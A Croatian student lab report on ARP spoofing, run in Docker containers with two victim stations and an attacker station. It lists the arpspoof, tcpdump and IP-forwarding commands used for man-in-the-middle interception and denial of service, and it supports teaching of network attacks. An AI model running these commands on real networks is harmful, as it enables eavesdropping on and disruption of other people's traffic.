# Sigurnost računala i podataka

# LABORATORIJSKA VJEŽBA 1 - ARP SPOOFING

U okviru prve vježbe analizirali smo ranjivost ARP-koja napadaču omogućava izvođenje ***man in the middle*** i ***denial of service*** napada na računalima koja dijele zajedničku lokalnu mrežu(LAN).

Napad je testiran koristeći 3 virtualizirana Docker računala: dvije žrtve station-1 i station-2 te napadač evil-station.

Budući da je vježba rađena na računalu sa Windows operacijskim sustavom, prvi zadatak bilo je pokretanje Ubuntu terminala koristeći WSL (Windows Subsystem for Linux).

Pozicioniravši se u odgovarajući direktorij, klonirani smo GitHub repozitorij sa potrebnim sadržajem.

```bash
git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)
```

Potom smo bili upoznati sa skriptama koje su zadužene za pokretanje i zaustavljanje docker kontejnera.

**Pokretanje**

```bash
$ ./start.sh
```

**Zaustavljanje**

```bash
$ ./stop.sh
```

Idući korak bilo je pokretanje interaktivnog shella u station-1 kontejneru te provjera njegove konfiguracije mrežnog interface-a.

**Pokretanje shella station-1**

```bash
$ docker exec -it station-1 bash
```

**Provjera konfiguracije mrežnog interface-a**

```bash
$ ifconfig -a
```

Dobivši podatke o stationu-1, provjerili smo nalazi li se station-2 na istoj mreži kao i station-1 te smo pokrenuli interaktivni shell i za drugi kontejner.

**Provjera mreže**

```bash
$ ping station-2
```

**Pokretanje shella station-2**

```bash
$ docker exec -it station-2 bash
```

Koristeći **netcat,** ostavirili smo konekciju između station-1 i station-2 kontejnera. ****

**Station-1 → server na portu 9000**

```bash
$ netcat -lp 9000
```

**Station 2 → client na hostname-u station-1 9000**

```bash
$ netcat station-1 9000
```

# Napad

Bilo je potrebno pokrenuti interaktivni shell u evil-station kontejneru te pokrenuti arpspoof i tcpdump.

**Pokretanje shella evil-station**

```bash
$ docker exec -it evil-station bash
```

**Arpspoof**

```bash
$ arpspoof -t station-1 station-2
```

**Tcpdump**

```bash
$ tcpdump
```

Tcpdump nam je omogućio praćenje prometa. Posljednja naredba koju smo pozvali bila je ona kojom smo u potpunosti spriječili promet između stationa-1 i stationa-2.

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

# Zaključak

- Uspješnom ARP spoofing napadu prethodi narušavanje integriteta
- Netcat nije enkriptiran način komunikacije budući da smo uspješno vidjeli čitav sadržaj